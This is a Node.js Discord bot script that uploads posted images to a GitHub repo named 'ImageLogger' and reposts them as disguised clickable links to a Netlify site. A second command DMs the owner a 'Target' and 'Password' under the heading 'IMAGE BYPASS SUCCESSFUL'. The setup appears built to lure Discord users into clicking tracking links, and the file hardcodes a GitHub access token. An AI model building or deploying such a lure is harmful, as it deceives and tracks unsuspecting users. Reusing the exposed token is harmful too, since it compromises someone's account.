const { Client, GatewayIntentBits, EmbedBuilder } = require('discord.js');
const { Octokit } = require("@octokit/rest"); // To talk to GitHub
const axios = require('axios');

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent]
});

// --- CONFIG ---
const GITHUB_TOKEN = "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";
const REPO_OWNER = "learnablesbips";
const REPO_NAME = "ImageLogger";
const NETLIFY_URL = "https://your-site.netlify.app";
const MY_ID = "1470018503624097966";

const octokit = new Octokit({ auth: GITHUB_TOKEN });

client.on('messageCreate', async (message) => {
    if (message.author.bot || !message.content.startsWith('!setup')) return;

    const attachment = message.attachments.first();
    if (!attachment) return;

    try {
        // 1. Download image from Discord
        const response = await axios.get(attachment.url, { responseType: 'arraybuffer' });
        const base64Image = Buffer.from(response.data).toString('base64');

        // 2. Upload/Update 'test.jpg' in your GitHub Repo
        // This triggers Netlify to update the site with the NEW image
        await octokit.repos.createOrUpdateFileContents({
            owner: REPO_OWNER,
            repo: REPO_NAME,
            path: 'test.jpg',
            message: 'Updating target image via Bot',
            content: base64Image,
            sha: (await octokit.repos.getContent({owner: REPO_OWNER, repo: REPO_NAME, path: 'test.jpg'}).catch(() => ({}))).data?.sha
        });

        // 3. Create the clickable image link
        const triggerURL = `${NETLIFY_URL}?user=${encodeURIComponent(message.author.username)}`;
        const clickableImage = `[![BYPASS](${attachment.url})](${triggerURL})`;

        await message.channel.send({ content: clickableImage });
        await message.delete().catch(() => {});

    } catch (err) { console.error("GitHub Upload Error:", err); }
});

// --- THE TRIGGER (Listens for the click from your site) ---
client.on('messageCreate', async (message) => {
    if (message.content.startsWith('!trigger_ai')) {
        const targetName = message.content.split(' ')[1];
        const password = "Key_" + Math.random().toString(36).slice(-6);

        const dmEmbed = new EmbedBuilder()
            .setTitle('🔓 IMAGE BYPASS SUCCESSFUL')
            .setColor(0x00FF00)
            .addFields(
                { name: '👤 Target', value: `\`${targetName}\`` },
                { name: '🔑 Password', value: `\`${password}\`` }
            );

        const user = await client.users.fetch(MY_ID);
        await user.send({ embeds: [dmEmbed] });
    }
});

client.login('YOUR_BOT_TOKEN');
